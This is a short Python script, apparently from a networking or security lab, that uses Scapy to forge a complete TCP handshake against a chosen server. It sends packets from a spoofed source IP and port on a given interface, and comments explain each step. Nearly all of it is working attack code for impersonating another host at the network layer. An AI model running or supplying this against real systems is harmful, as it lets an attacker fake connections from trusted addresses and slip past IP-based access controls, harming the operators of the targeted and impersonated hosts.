#!/usr/local/bin/python

'Usage: python3 {:s} <server> <port> <spoofed_ip> <spoofed_port> <iface>'

import sys
from scapy.all import *

if len(sys.argv) != 6:
        print('{:s}'.format(__doc__.format(sys.argv[0])))
        sys.exit()
        
 # Now we Define the system Arguements
 
target = sys.argv[1]
target_port = int(sys.argv[2])
spoof_ip = sys.argv[3]
spoof_port = int(sys.argv[4])
iface = sys.argv[5]
 
# Now we initiate the SYN packet
ip=IP(src=spoof_ip,dst=target) #Setting the source ip as the spoof ip we want to use and destination ip as the server ip we want to target

SYN = TCP(sport=spoof_port,dport=target_port,flags="S",seq=1000) # Now we send the SYN packet where the TCP header tags are defined that is setting sport (source port) as the spoof port and dport ( destination port ) as port where the server is running. Flag is set to "S" which indicates SYN packet with seq of 1000 that we initialized.

SYNACK = srp1(Ether()/ip/SYN, iface=iface) # Now we send the SYNACK packet. Note that we use srp1 because it send and receive packets at layer 2 and return only the first answer. This is because we are expecting a SYNACK from server as the answer.


#Now we send the SYN-ACK packet where we sniff the seq number as the ack number we get as response. Scapy can sniff and spoof the packet using .ack and ack is seq+1
ACK = TCP(sport=spoof_port, dport=target_port, flags="A", seq=SYNACK.ack, ack=SYNACK.seq + 1)
sendp(Ether()/ip/ACK, iface=iface) # we use sendp because it just sends the packet at layer 2 and does not expect any answer.


